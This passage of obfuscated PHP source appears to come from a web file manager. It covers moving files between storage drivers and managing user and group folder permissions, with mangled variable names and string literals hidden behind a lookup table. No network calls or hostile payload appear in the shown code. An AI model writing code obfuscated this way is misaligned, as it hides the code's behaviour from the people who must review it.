$è‘³ì; $®Ÿ‡©ĞÒ = LNG($ô…¡£Çå == $İ¾Œ®ãÉ[557] ? $İ¾Œ®ãÉ[2174] : $İ¾Œ®ãÉ[2175]); $œéá‚™İ = new TaskFileTransfer($Ë²ŞÁì, $İ¾Œ®ãÉ[2169], $ÃãûŞ¶, $®Ÿ‡©ĞÒ . "\x28{$è‘³ì}\51"); $œéá‚™İ->task[$İ¾Œ®ãÉ[754]] = (double) $¦»ºÕ; $¼¹¨¯§ê = KodIO::defaultDriver(); $üıà£§ = $¼¹¨¯§ê[$İ¾Œ®ãÉ[399]]; $×ßØ¸ß¯ = "\173\x69\x6f\72{$üıà£§}\175\57"; $œ¼×›ÔØ = !0; $ë¡¼‡ìÚ = array(); $ò…ã«£° = Model($İ¾Œ®ãÉ[199])->where($Àˆ¥‹Ï)->field($İ¾Œ®ãÉ[2176])->select(); foreach ($ò…ã«£° as $ä³ÆöÉÅ) { $§Í†õ”· = $ä³ÆöÉÅ[$İ¾Œ®ãÉ[84]]; $ğÈå›†· = $×ßØ¸ß¯ . str_replace("\x7b\151\157\72{$è‘³ì}\x7d\57", $İ¾Œ®ãÉ[12], $§Í†õ”·); if (!IO::exist($§Í†õ”·)) { $ë¡¼‡ìÚ[] = $ä³ÆöÉÅ[$İ¾Œ®ãÉ[468]]; $œéá‚™İ->updateFileEnd($ä³ÆöÉÅ[$İ¾Œ®ãÉ[32]], $ä³ÆöÉÅ[$İ¾Œ®ãÉ[76]]); continue; } if (IO::exist($ğÈå›†·)) { $œéá‚™İ->updateFileEnd($ä³ÆöÉÅ[$İ¾Œ®ãÉ[32]], $ä³ÆöÉÅ[$İ¾Œ®ãÉ[76]]); continue; } if (!IO::move($§Í†õ”·, get_path_father($ğÈå›†·))) { $œ¼×›ÔØ = !1; break; } $Àˆ¥‹Ï = array($İ¾Œ®ãÉ[468] => $ä³ÆöÉÅ[$İ¾Œ®ãÉ[468]]); $¾²±¢§Ü = array($İ¾Œ®ãÉ[808] => $üıà£§, $İ¾Œ®ãÉ[84] => $ğÈå›†·); Model($İ¾Œ®ãÉ[199])->where($Àˆ¥‹Ï)->save($¾²±¢§Ü); } $this->removeByFileID($ë¡¼‡ìÚ); if (!$œ¼×›ÔØ) { $œéá‚™İ->stop($Ë²ŞÁì); return !1; } $œéá‚™İ->end(); if ($ô…¡£Çå == $İ¾Œ®ãÉ[1818]) { $this->remove($è‘³ì); } } public function progress($©½°ü×Ñ, $¡É§ç§Â) { return Task::get($¡É§ç§Â . $_SERVER[­õöî’–][2173] . $©½°ü×Ñ); } private function removeByFileID($ÛüºçÊ = array()) { $‘Ò’Œó =& $_SERVER[­õöî’–]; if (empty($ÛüºçÊ)) { return; } $¬¹Ğ‚´ = array($‘Ò’Œó[468] => array($‘Ò’Œó[7], $ÛüºçÊ)); $Óí×íî = Model($‘Ò’Œó[1334])->where($¬¹Ğ‚´)->field($‘Ò’Œó[402])->select(); if (!$Óí×íî) { return; } $Óí×íî = array_to_keyvalue($Óí×íî, $‘Ò’Œó[12], $‘Ò’Œó[402]); foreach ($Óí×íî as $æÔºƒÄÙ) { Model($‘Ò’Œó[416])->removeNow($æÔºƒÄÙ, !1); } } private function removeShareItems($„· •£²) { $àÒ½Ïí¡ =& $_SERVER[­õöî’–]; $—µœ‹ÆÈ = "\173\x69\x6f\72{$„· •£²}\175\x2f"; $Ôïƒ²Ù = array($àÒ½Ïí¡[402] => 0, $àÒ½Ïí¡[1174] => array($àÒ½Ïí¡[383], "{$—µœ‹ÆÈ}\45")); $ïš½Š = Model($àÒ½Ïí¡[1829])->where($Ôïƒ²Ù)->field($àÒ½Ïí¡[489])->select(); if (empty($ïš½Š)) { return; } $ú•æ±¸¤ = array_to_keyvalue($ïš½Š, $àÒ½Ïí¡[12], $àÒ½Ïí¡[489]); Model($àÒ½Ïí¡[601])->remove($ú•æ±¸¤); } } goto bìŠùºÒ§İ; båæÁ³ÒïÆ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\x65\137\141\x75\164\150"; public function getAuth($ø¿ïşè) { $ÉÁäá˜û =& $_SERVER[­õöî’–]; $ÉÄ†‚¯ = $this->sourceAuthSelect($ø¿ïşè); $áù­ø = array(); $Å¥†ù‹Å = array(); $¥à©ä‡ = 2 << 25; foreach ($ÉÄ†‚¯ as $¬ÔîñÚ) { $Êø­ÆÄ = Model($ÉÁäá˜û[507])->listData($¬ÔîñÚ[$ÉÁäá˜û[1953]]); if (!$Êø­ÆÄ) { continue; } $áù­ø[] = $¬ÔîñÚ; $ƒ˜Ğº¾œ = 0; if ($¬ÔîñÚ[$ÉÁäá˜û[411]] == SourceModel::TYPE_GROUP) { $ƒ˜Ğº¾œ = $¥à©ä‡ * 2; } if ($¬ÔîñÚ[$ÉÁäá˜û[411]] == SourceModel::TYPE_USER) { $ƒ˜Ğº¾œ = $¥à©ä‡; } if ($¬ÔîñÚ[$ÉÁäá˜û[411]] == SourceModel::TYPE_USER && $¬ÔîñÚ[$ÉÁäá˜û[505]] == $ÉÁäá˜û[197]) { $ƒ˜Ğº¾œ = 0; } $Å¥†ù‹Å[] = $Êø­ÆÄ[$ÉÁäá˜û[413]] + $ƒ˜Ğº¾œ; } array_multisort($Å¥†ù‹Å, SORT_DESC, $áù­ø); return $áù­ø; } public function sourceAuthSelect($â÷‹·¾) { $Š¥òÌÚ÷ =& $_SERVER[­õöî’–]; static $Öõ¨‚—ß = array(); $±‹ËŸçŞ = is_array($â÷‹·¾) ? !1 : !0; if ($±‹ËŸçŞ) { $â÷‹·¾ = array($â÷‹·¾); } $šïı¹Ç‚ = array(); foreach ($â÷‹·¾ as $‰¡ƒ‹) { if (isset($Öõ¨‚—ß[$‰¡ƒ‹])) { $šïı¹Ç‚[$‰¡ƒ‹] = $Öõ¨‚—ß[$‰¡ƒ‹]; } } if (count($šïı¹Ç‚) == count($â÷‹·¾)) { return $±‹ËŸçŞ ? $šïı¹Ç‚[$â÷‹·¾[0]] : $šïı¹Ç‚; } $‰ˆõ¾Øï = $Š¥òÌÚ÷[2026]; $ğ ø†Œã = array($Š¥òÌÚ÷[402] => array($Š¥òÌÚ÷[7], $â÷‹·¾)); $§³òşë = $this->field($‰ˆõ¾Øï)->order($Š¥òÌÚ÷[399])->where($ğ ø†Œã)->select(); $Âó›ÓÙÍ = array_to_keyvalue_group($§³òşë, $Š¥òÌÚ÷[402]); foreach ($â÷‹·¾ as $‰¡ƒ‹) { $Öõ¨‚—ß[$‰¡ƒ‹] = $Âó›ÓÙÍ[$‰¡ƒ‹] ? $Âó›ÓÙÍ[$‰¡ƒ‹] : array(); } if ($±‹ËŸçŞ) { return $§³òşë; } return $Âó›ÓÙÍ; } public function setAuth($ÎÕ©¬ÃÅ, $ŠÓï –) { $Î´Œ•ˆ‚ =& $_SERVER[­õöî’–]; $ Ë›œı¸ = Model($Î´Œ•ˆ‚[1334])->sourceInfo($ÎÕ©¬ÃÅ); if (!$ Ë›œı¸) { return !1; } if ($ Ë›œı¸[$Î´Œ•ˆ‚[411]] != SourceModel::TYPE_GROUP) { return !1; } $ı«¶ˆéü = 1; $»‹ÇÜç‚ = $ Ë›œı¸[$Î´Œ•ˆ‚[505]]; if ($»‹ÇÜç‚ != $ı«¶ˆéü) { $ÕËá“…œ = array($Î´Œ•ˆ‚[1849] => $»‹ÇÜç‚); $íõªÅ¹Î = Model($Î´Œ•ˆ‚[1939])->field($Î´Œ•ˆ‚[1660])->where($ÕËá“…œ)->select(); $íõªÅ¹Î = array_to_keyvalue($íõªÅ¹Î, $Î´Œ•ˆ‚[12], $Î´Œ•ˆ‚[1660]); } $ªÉı¿Èê = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $„÷—¤Ôì = array(); foreach ($ŠÓï – as $˜ôÒÏïì) { if (!in_array($˜ôÒÏïì[$Î´Œ•ˆ‚[411]], $ªÉı¿Èê)) { show_json(LNG($Î´Œ•ˆ‚[2027]), !1); } if ($»‹ÇÜç‚ != $ı«¶ˆéü) { if ($˜ôÒÏïì[$Î´Œ•ˆ‚[411]] == SourceModel::TYPE_GROUP) { } if ($˜ôÒÏïì[$Î´Œ•ˆ‚[505]] != 0 && !in_array($˜ôÒÏïì[$Î´Œ•ˆ‚[505]], $íõªÅ¹Î)) { } } if ($˜ôÒÏïì[$Î´Œ•ˆ‚[505]] == 0) { $˜ôÒÏïì[$Î´Œ•ˆ‚[411]] = SourceModel::TYPE_USER; } $„÷—¤Ôì[] = array($Î´Œ•ˆ‚[402] => $ÎÕ©¬ÃÅ, $Î´Œ•ˆ‚[411] => intval($˜ôÒÏïì[$Î´Œ•ˆ‚[411]]), $Î´Œ•ˆ‚[505] => intval($˜ôÒÏïì[$Î´Œ•ˆ‚[505]]), $Î´Œ•ˆ‚[1953] => intval($˜ôÒÏïì[$Î´Œ•ˆ‚[1953]]) ? intval($˜ôÒÏïì[$Î´Œ•ˆ‚[1953]]) : 0, $Î´Œ•ˆ‚[2009] => intval($˜ôÒÏïì[$Î´Œ•ˆ‚[2009]]) ? intval($˜ôÒÏïì[$Î´Œ•ˆ‚[2009]]) : -1); } $this->where(array($Î´Œ•ˆ‚[417] => $ÎÕ©¬ÃÅ))->delete(); $this->addAll($„÷—¤Ôì); return !0; } public function authClear($€¾€Ó®) { $´¤Ü¬…˜ =& $_SERVER[­õöî’–]; $ßı³Õ… = Model($´¤Ü¬…˜[1334])->sourceInfo($€¾€Ó®); $¸ãæ´åƒ = array($€¾€Ó®); if ($ßı³Õ…[$´¤Ü¬…˜[410]] == $´¤Ü¬…˜[88]) { $ú³Ã¬Ã = array($´¤Ü¬…˜[590] => array($´¤Ü¬…˜[550], $ßı³Õ…[$´¤Ü¬…˜[521]] . $€¾€Ó® . $´¤Ü¬…˜[551])); $¸ãæ´åƒ = Model($´¤Ü¬…˜[1334])->field($´¤Ü¬…˜[417])->where($ú³Ã¬Ã)->getField($´¤Ü¬…˜[402], !0); $¸ãæ´åƒ[] = $€¾€Ó®; } $this->where(array($´¤Ü¬…˜[417] => array($´¤Ü¬…˜[418], $¸ãæ´åƒ)))->delete(); return !0; } public function getAllChildren($Ó‹§¶±Ü) { $›Æ®‘¬à =& $_SERVER[­õöî’–]; $¶¹†·•Ğ = Model($›Æ®‘¬à[1334])->sourceInfo($Ó‹§¶±Ü); if ($¶¹†·•Ğ[$›Æ®‘¬à[410]] != $›Æ®‘¬à[88]) { return $this->sourceListAuth(array($Ó‹§¶±Ü)); } if ($¶¹†·•Ğ[$›Æ®‘¬à[411]] != SourceModel::TYPE_GROUP) { return array(); } $Äè¼ğüÚ = 1; $Ÿı«ë‡ = array($Ó‹§¶±Ü); if ($¶¹†·•Ğ[$›Æ®‘¬à[432]] == $›Æ®‘¬à[197] && $¶¹†·•Ğ[$›Æ®‘¬à[505]] != $Äè¼ğüÚ) { $Ÿı«ë‡ = $this->groupChidldAllRootSource($¶¹†·•Ğ[$›Æ®‘¬à[505]]); } $œ›ş¥ë¡ = $this->field($›Æ®‘¬à[402])->group($›Æ®‘¬à[402])->select(); $œ›ş¥ë¡ = array_to_keyvalue($œ›ş¥ë¡, $›Æ®‘¬à[12], $›Æ®‘¬à[402]); if (!$œ›ş¥ë¡) { return array(); } $›´˜ìñŠ = $›Æ®‘¬à[2028]; $Éãâ†©¨ = array($›Æ®‘¬à[402] => array($›Æ®‘¬à[7], $œ›ş¥ë¡), $›Æ®‘¬à[431] => $›Æ®‘¬à[197]); $†‹¤‹µÛ = Model($›Æ®‘¬à[816])->field($›´˜ìñŠ)->where($Éãâ†©¨)->select(); $¶Ê¢áà’ = array($Ó‹§¶±Ü); foreach ($†‹¤‹µÛ as $¿»í¡»œ) { foreach ($Ÿı«ë‡ as $—õÊ”€ó) { $íñîºª = $›Æ®‘¬à[50] . $—õÊ”€ó . $›Æ®‘¬à[50]; $øõ¯éˆ® = $¿»í¡»œ[$›Æ®‘¬à[521]] . $¿»í¡»œ[$›Æ®‘¬à[402]] . $›Æ®‘¬à[50]; if (strstr($øõ¯éˆ®, $íñîºª)) { $¶Ê¢áà’[] = $¿»í¡»œ[$›Æ®‘¬à[402]]; break; } } } return $this->sourceListAuth($¶Ê¢áà’); } private function sourceListAuth($ñùå«èé) { $…æØ½¦ =& $_SERVER[­õöî’–]; $ë¢²Ó = Model($…æØ½¦[1334])->sourceListInfo($ñùå«èé, !0); $»ğìŒõ½ = $this->sourceAuthSelect($ñùå«èé); $¼±ô¹ñ = array(); $éõè‘²Ô = array(); foreach ($ë¢²Ó as $èô·¬œ“) { unset($èô·¬œ“[$…æØ½¦[456]]); unset($èô·¬œ“[$…æØ½¦[454]]); unset($èô·¬œ“[$…æØ½¦[413]]); unset($èô·¬œ“[$…æØ½¦[86]]); $“Ç®¦Œ = $»ğìŒõ½[$èô·¬œ“[$…æØ½¦[402]]]; if (!$“Ç®¦Œ) { continue; } $èô·¬œ“[$…æØ½¦[2029]] = $this->authTargetInfo($“Ç®¦Œ); $èô·¬œ“[$…æØ½¦[519]] = rtrim($èô·¬œ“[$…æØ½¦[525]], $…æØ½¦[8]) . $…æØ½¦[8] . ltrim($èô·¬œ“[$…æØ½¦[519]], $…æØ½¦[8]); $¼±ô¹ñ[] = $èô·¬œ“; $áò˜±¸ü = count(explode($…æØ½¦[8], trim($èô·¬œ“[$…æØ½¦[519]], $…æØ½¦[8]))); $éõè‘²Ô[] = $áò˜±¸ü + ($èô·¬œ“[$…æØ½¦[33]] == $…æØ½¦[75] ? 0 : 1000); } array_multisort($éõè‘²Ô, SORT_ASC, $¼±ô¹ñ); return $¼±ô¹ñ; } private function groupChidldAllRootSource($§°Ş) { $÷›¸·“· =& $_SERVER[­õöî’–]; $²í˜Àª± = Model($÷›¸·“·[2030])->groupChildrenAll($§°Ş); $ô× “ã = array($÷›¸·“·[432] => 0, $÷›¸·“·[505] => array($÷›¸·“·[7], $²í˜Àª±), $÷›¸·“·[411] => SourceModel::TYPE_GROUP); $Ï®à÷ = Model($÷›¸·“·[816])->field($÷›¸·“·[402])->where($ô× “ã)->select(); $Ï®à÷ = array_to_keyvalue($Ï®à÷, $÷›¸·“·[12], $÷›¸·“·[402]); return $Ï®à÷; } private function authTargetInfo($İ¡¸åó) { $àœÒŸ´ =& $_SERVER[­õöî’–]; $åºüóí÷ = array(); $ÄŞ¯¥Æö = array(); $ô¢¤ËÏë = 2 << 25; foreach ($İ¡¸åó as $‘½ÜâôŠ) { $¬ô£ıã = Model($àœÒŸ´[507])->listData($‘½ÜâôŠ[$àœÒŸ´[1953]]); if (!$¬ô£ıã) { continue; } if ($‘½ÜâôŠ[$àœÒŸ´[411]] == SourceModel::TYPE_USER) { $ÄøëÔşæ = Model($àœÒŸ´[513])->getInfoSimpleOuter($‘½ÜâôŠ[$àœÒŸ´[505]]); if ($ÄøëÔşæ[$àœÒŸ´[1660]] == $àœÒŸ´[1187]) { continue; } if ($ÄøëÔşæ[$àœÒŸ´[1660]] == $àœÒŸ´[197]) { $ÄøëÔşæ[$àœÒŸ´[32]] = LNG($àœÒŸ´[2031]); } } else { $ÄøëÔşæ = Model($àœÒŸ´[522])->getInfoSimple($‘½ÜâôŠ[$àœÒŸ´[505]]); } if (!$ÄøëÔşæ) { continue; } $ÄøëÔşæ[$àœÒŸ´[467]] = $¬ô£ıã; $åºüóí÷[] = $ÄøëÔşæ; $×ûßù¦ğ = 0; if ($‘½ÜâôŠ[$àœÒŸ´[411]] == SourceModel::TYPE_GROUP) { $×ûßù¦ğ = $ô¢¤ËÏë * 2; } if ($‘½ÜâôŠ[$àœÒŸ´[411]] == SourceModel::TYPE_USER) { $×ûßù¦ğ = $ô¢¤ËÏë; } if ($‘½ÜâôŠ[$àœÒŸ´[411]] == SourceModel::TYPE_USER && $‘½ÜâôŠ[$àœÒŸ´[505]] == $àœÒŸ´[197]) { $×ûßù¦ğ = 0; } $ÄŞ¯¥Æö[] = $¬ô£ıã[$àœÒŸ´[413]] + $×ûßù¦ğ; } array_multisort($ÄŞ¯¥Æö, SORT_DESC, $åºüóí÷); return $åºüóí÷; } public function getAllChildrenByUser($ãÈöÌ, $åâ”¨Ñ) { $ùöø¼Ôş =& $_SERVER[­õöî’–]; $Ë§ø² = Model($ùöø¼Ôş[535])->getInfo($åâ”¨Ñ); if (!$åâ”¨Ñ || !$ãÈöÌ || !$Ë§ø²) { return array(); } $±úÙÜ®ğ = Model($ùöø¼Ôş[1334])->sourceInfo($ãÈöÌ); $Æ¦”Øõ™ = array(); $à‡‚ÀŞÚ = 1; if ($±úÙÜ®ğ[$ùöø¼Ôş[432]] == $ùöø¼Ôş[197] && $±úÙÜ®ğ[$ùöø¼Ôş[505]] != $à‡‚ÀŞÚ && $this->groupContainUser($±úÙÜ®ğ[$ùöø¼Ôş[505]], $åâ”¨Ñ)) { foreach ($Ë§ø²[$ùöø¼Ôş[2032]] as $¯¾•÷Áì) { $Ìê·İ™¹ = Model($ùöø¼Ôş[522])->getInfo($¯¾•÷Áì[$ùöø¼Ôş[1849]]); $ÖçÒÎî = Model($ùöø¼Ôş[535])->getInfoSimpleOuter($åâ”¨Ñ); $ÖçÒÎî[$ùöø¼Ôş[467]] = $¯¾•÷Áì[$ùöø¼Ôş[413]]; if (Model($ùöø¼Ôş[507])->authCheckAction($¯¾•÷Áì[$ùöø¼Ôş[413]][$ùöø¼Ôş[413]], $ùöø¼Ôş[1870])) { continue; } $¥ĞÚÃùÉ = array($ùöø¼Ôş[32] => $ùöø¼Ôş[1207] . $Ìê·İ™¹[$ùöø¼Ôş[32]], $ùöø¼Ôş[402] => $Ìê·İ™¹[$ùöø¼Ôş[86]][$ùöø¼Ôş[402]], $ùöø¼Ôş[84] => KodIO::make($Ìê·İ™¹[$ùöø¼Ôş[86]][$ùöø¼Ôş[402]]), $ùöø¼Ôş[432] => $ùöø¼Ôş[197], $ùöø¼Ôş[411] => $ùöø¼Ôş[515], $ùöø¼Ôş[33] => $ùöø¼Ôş[554], $ùöø¼Ôş[519] => $Ìê·İ™¹[$ùöø¼Ôş[526]], $ùöø¼Ôş[1849] => $Ìê·İ™¹[$ùöø¼Ôş[1849]], $ùöø¼Ôş[523] => $Ìê·İ™¹[$ùöø¼Ôş[432]], $ùöø¼Ôş[2029] => array($ÖçÒÎî)); $Æ¦”Øõ™[$¥ĞÚÃùÉ[$ùöø¼Ôş[402]]] = $¥ĞÚÃùÉ; } } $ÊÕ¥·Ò® = array(); $óÀéŒ‡î = $this->getAllChildren($ãÈöÌ); foreach ($óÀéŒ‡î as $ÑéÉè˜) { $é¬¸ŞÌ† = !1; foreach ($ÑéÉè˜[$ùöø¼Ôş[2029]] as $©ô·ÆŒÌ) { if ($©ô·ÆŒÌ[$ùöø¼Ôş[1660]]) { if ($©ô·ÆŒÌ[$ùöø¼Ôş[1660]] == $åâ”¨Ñ) { $é¬¸ŞÌ† = !0; break; } } if ($©ô·ÆŒÌ[$ùöø¼Ôş[1849]]) { if ($this->groupContainUser($©ô·ÆŒÌ[$ùöø¼Ôş[1849]], $åâ”¨Ñ)) { $é¬¸ŞÌ† = !0; break; } } } if ($é¬¸ŞÌ†) { $ÊÕ¥·Ò®[] = $ÑéÉè˜; } $á£•×æÇ = $ÑéÉè˜[$ùöø¼Ôş[402]]; if (isset($Æ¦”Øõ™[$á£•×æÇ])) { $ÑéÉè˜[$ùöø¼Ôş[2029]][] = $Æ¦”Øõ™[$á£•×æÇ][0]; $Æ¦”Øõ™[$á£•×æÇ] = !1; } } $Æ¦”Øõ™ = array_filter(array_values($Æ¦”Øõ™)); $ÊÕ¥·Ò® = array_merge($Æ¦”Øõ™, $ÊÕ¥·Ò®); return $ÊÕ¥·Ò®; } public function setAllChildrenByUser($‹›©È€Ü, $èÄÄ¬Ÿ®, $«ƒêÆ) { $†ª±òôø =& $_SERVER[­õöî’–]; $…¿æŠ˜‡ = $this->getAllChildrenByUser($‹›©È€Ü, $èÄÄ¬Ÿ®); if (!$«ƒêÆ || !$…¿æŠ˜‡) { return !1; } foreach ($…¿æŠ˜‡ as $ŞªÃıêñ) { $Œ‹©ÎŞÁ = array(); foreach ($ŞªÃıêñ[$†ª±òôø[2029]] as $ÑøÒ²Ö) { $­ç–¥¯³ = $ÑøÒ²Ö[$†ª±òôø[467]]; $•šŠİÃ = $ÑøÒ²Ö[$†ª±òôø[1660]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ˆ‚³ÖÕ¥ = $ÑøÒ²Ö[$†ª±òôø[1660]] ? $ÑøÒ²Ö[$†ª±òôø[1660]] : $ÑøÒ²Ö[$†ª±òôø[1849]]; if ($ÑøÒ²Ö[$†ª±òôø[1660]] && $ÑøÒ²Ö[$†ª±òôø[1660]] == $èÄÄ¬Ÿ®) { continue; } $Œ‹©ÎŞÁ[] = array($†ª±òôø[402] => $ŞªÃıêñ[$†ª±òôø[402]], $†ª±òôø[411] => $•šŠİÃ, $†ª±òôø[505] => intval($ˆ‚³ÖÕ¥), $†ª±òôø[1953] => isset($­ç–¥¯³[$†ª±òôø[399]]) ? intval($­ç–¥¯³[$†ª±òôø[399]]) : 0, $†ª±òôø[2009] => isset($­ç–¥¯³[$†ª±òôø[2009]]) ? intval($­ç–¥¯³[$†ª±òôø[2009]]) : -1); } $Œ‹©ÎŞÁ[] = array($†ª±òôø[402] => $ŞªÃıêñ[$†ª±òôø[402]], $†ª±òôø[411] => SourceModel::TYPE_USER, $†ª±òôø[505] => intval($èÄÄ¬Ÿ®), $†ª±òôø[1953] => intval($«ƒêÆ), $†ª±òôø[2009] => -1); $this->where(array($†ª±òôø[417] => $ŞªÃıêñ[$†ª±òôø[402]]))->delete(); $this->addAll($Œ‹©ÎŞÁ); } return !0; } public function get($Ø›°Ğôä) { $œÇ¦”„ = $this->getSourceList(array($Ø›°Ğôä), !0); return $œÇ¦”„[0]; } public function getSourceList($ÚÀîş€¡, $¿Â•¹öˆ = false, $ØØşš† = false) { $ÚÁãâ‚Ä =& $_SERVER[­õöî’–]; if (!$ÚÀîş€¡) { return array(); } $ãöÖöÒÉ = Model($ÚÁãâ‚Ä[1334]); if (!$¿Â•¹öˆ && count($ÚÀîş€¡) == 1) { $¿Â•¹öˆ = array(); $¿Â•¹öˆ[$ÚÀîş€¡[0]] = $ãöÖöÒÉ->sourceInfo($ÚÀîş€¡[0]); } if (!$¿Â•¹öˆ) { $—ó—­é = array($ÚÁãâ‚Ä[417] => array($ÚÁãâ‚Ä[418], $ÚÀîş€¡)); $¿Â•¹öˆ = $ãöÖöÒÉ->field($ÚÁãâ‚Ä[2033])->where($—ó—­é)->select(); $¿Â•¹öˆ = array_to_keyvalue($¿Â•¹öˆ, $ÚÁãâ‚Ä[402]); } $×œÍ³ş¥ = $ÚÀîş€¡; foreach ($¿Â•¹öˆ as $§±ú²ƒ => $Çˆ÷³°›) { $™¦ä×à½ = $ãöÖöÒÉ->parentLevelArray($Çˆ÷³°›[$ÚÁãâ‚Ä[521]]); $×œÍ³ş¥ = array_merge($×œÍ³ş¥, array($§±ú²ƒ), array_reverse($™¦ä×à½)); } $×œÍ³ş¥ = array_values(array_unique($×œÍ³ş¥)); if (!$×œÍ³ş¥) { return array(); } $³Ÿ™Çå« = $this->sourceAuthSelect($×œÍ³ş¥); $¨ó½ƒ¯‘ = array(); foreach ($×œÍ³ş¥ as $Ò“âÁ¤) { if (isset($³Ÿ™Çå«[$Ò“âÁ¤])) { $¨ó½ƒ¯‘[$Ò“âÁ¤] = $³Ÿ™Çå«[$Ò“âÁ¤]; } } $”–Òàì¼ = $this->userIsRoot($ØØşš†); $ëğÇ¼‰ = AuthModel::authAll(); $´äò€å¥ = array($ÚÁãâ‚Ä[414] => $ëğÇ¼‰, $ÚÁãâ‚Ä[2034] => array($ÚÁãâ‚Ä[419] => 0, $ÚÁãâ‚Ä[1855] => $ëğÇ¼‰, $ÚÁãâ‚Ä[420] => LNG($ÚÁãâ‚Ä[2035]), $ÚÁãâ‚Ä[1872] => $ÚÁãâ‚Ä[2036])); $¹©¿ø¨Ö = array(); foreach ($¿Â•¹öˆ as $Ò“âÁ¤ => $¢âšáçƒ) { if ($”–Òàì¼ && $GLOBALS[$ÚÁãâ‚Ä[6]][$ÚÁãâ‚Ä[1868]]) { $¹©¿ø¨Ö[$Ò“âÁ¤] = $´äò€å¥; continue; } $¹©¿ø¨Ö[$Ò“âÁ¤] = $this->makeSourceAuth($¢âšáçƒ, $¨ó½ƒ¯‘, $ØØşš†); } return $¹©¿ø¨Ö; } public function authDeepCheck($æ›©è«Ë, $Ûæ¸Ó¿Ï = false) { $Û¢ÀŞ =& $_SERVER[­õöî’–]; $Ûæ¸Ó¿Ï = $Ûæ¸Ó¿Ï ? $Ûæ¸Ó¿Ï : USER_ID; $«”âµ©ã = $this->makeAuthDeep($Ûæ¸Ó¿Ï); if (!in_array($æ›©è«Ë, $«”âµ©ã[$Û¢ÀŞ[2037]])) { return !1; } $µª†í©Ã = array(); foreach ($«”âµ©ã[$Û¢ÀŞ[2038]] as $¥Ä©¤ßë => $ù¶È±…¯) { if (!in_array($æ›©è«Ë, $ù¶È±…¯)) { continue; } $µª†í©Ã[] = $¥Ä©¤ßë; } if (!$µª†í©Ã) { return !1; } $Ñé—ëô = $µª†í©Ã ? $µª†í©Ã[0] : $æ›©è«Ë; return array($Û¢ÀŞ[414] => -1, $Û¢ÀŞ[467] => array($Û¢ÀŞ[419] => $Û¢ÀŞ[1187], $Û¢ÀŞ[1855] => $Û¢ÀŞ[197], $Û¢ÀŞ[420] => LNG($Û¢ÀŞ[2039]), $Û¢ÀŞ[1872] => $Û¢ÀŞ[2040]), $Û¢ÀŞ[2041] => LNG($Û¢ÀŞ[2042]), $Û¢ÀŞ[2043] => $this->sourceAuthInfo($Ñé—ëô)); } protected function makeAuthDeep($ˆ™öõ¤¯ = false) { $€üôîê =& $_SERVER[­õöî’–]; static $³£ÒÊÚë = array(); $ˆ™öõ¤¯ = $ˆ™öõ¤¯ ? $ˆ™öõ¤¯ : USER_ID; if (isset($³£ÒÊÚë[$ˆ™öõ¤¯])) { return $³£ÒÊÚë[$ˆ™öõ¤¯]; } $äÆğÛ´» = Model($€üôîê[2044])->listData(); $‹ÈÎåªå = array(); foreach ($äÆğÛ´» as $Æ¯¡¡Å) { if ($Æ¯¡¡Å[$€üôîê[413]] == 0 && $Æ¯¡¡Å[$€üôîê[1871]] == $€üôîê[88]) { $‹ÈÎåªå[] = $Æ¯¡¡Å[$€üôîê[399]]; } } $ñƒïóÛí = $this->userGroupParents($ˆ™öõ¤¯); $ÄĞ˜”Æë = array($€üôîê[411] => SourceModel::TYPE_USER, $€üôîê[505] => $ˆ™öõ¤¯); if ($ñƒïóÛí) { $ÄĞ˜”Æë = array(array($€üôîê[411] => SourceModel::TYPE_USER, $€üôîê[505] => $ˆ™öõ¤¯), array($€üôîê[411] => SourceModel::TYPE_GROUP, $€üôîê[505] => array($€üôîê[418], $ñƒïóÛí)), $€üôîê[998] => $€üôîê[1947]); } $ç»Ôüî¼ = $this->field($€üôîê[2045])->where($ÄĞ˜”Æë)->select(); $ÆŠÉÛÚŞ = array(); $§Ñ²ğ¤Í = array_to_keyvalue_group($ç»Ôüî¼, $€üôîê[402]); foreach ($§Ñ²ğ¤Í as $ñÃ‹¾•º => $¼¿¦âĞÇ) { $ƒë°ì™Ã = $this->authArrayCheck($¼¿¦âĞÇ, $ˆ™öõ¤¯); if ($ƒë°ì™Ã[$€üôîê[414]] > 0) { $ÆŠÉÛÚŞ[] = $ñÃ‹¾•º . $€üôîê[12]; } } if ($ñƒïóÛí) { $ÜĞÒÍ† = Model($€üôîê[522]); foreach ($ñƒïóÛí as $È£Û€Š¶) { $»‰Õåæ = $ÜĞÒÍ†->getInfo($È£Û€Š¶); if (!$»‰Õåæ || !is_array($»‰Õåæ[$€üôîê[86]])) { continue; } $ÆŠÉÛÚŞ[] = $»‰Õåæ[$€üôîê[86]][$€üôîê[402]]; } } $¤ëãìßÁ = array(); $Å÷¨¼°÷ = $ñƒïóÛí; $£ÔÛ½Œ = Model($€üôîê[1334]); $ÜĞÒÍ† = Model($€üôîê[522]); $½”…Âã´ = array(); $ò‘ÇÀá¡ = array(); $ü·î§Ã‚ = array(); $àİú¿Ïï = array(); if ($ÆŠÉÛÚŞ) { $ÇåÉÍ‡ = $£ÔÛ½Œ->where(array($€üôîê[402] => array($€üôîê[418], $ÆŠÉÛÚŞ)))->select(); foreach ($ÇåÉÍ‡ as $£Öí‘Ÿâ) { $½Ä¾¯§© = $£ÔÛ½Œ->parentLevelArray($£Öí‘Ÿâ[$€üôîê[521]]); $¤ëãìßÁ = array_merge($¤ëãìßÁ, $½Ä¾¯§©); $Å÷¨¼°÷[] = $£Öí‘Ÿâ[$€üôîê[505]]; $½”…Âã´[$£Öí‘Ÿâ[$€üôîê[402]]] = $½Ä¾¯§©; $ò‘ÇÀá¡[$£Öí‘Ÿâ[$€üôîê[402]]] = $£Öí‘Ÿâ[$€üôîê[505]]; } } $Å÷¨¼°÷ = array_values(array_unique($Å÷¨¼°÷)); $š£¿ë©â = $Å÷¨¼°÷; foreach ($š£¿ë©â as $È£Û€Š¶) { $»‰Õåæ = $ÜĞÒÍ†->getInfo($È£Û€Š¶); $½Ä¾¯§© = $£ÔÛ½Œ->parentLevelArray($»‰Õåæ[$€üôîê[521]]); $Å÷¨¼°÷ = array_merge($Å÷¨¼°÷, $½Ä¾¯§©); } $Å÷¨¼°÷ = array_values(array_unique($Å÷¨¼°÷)); foreach ($Å÷¨¼°÷ as $È£Û€Š¶) { $»‰Õåæ = $ÜĞÒÍ†->getInfo($È£Û€Š¶); $¤ëãìßÁ[] = $»‰Õåæ[$€üôîê[86]][$€üôîê[402]]; 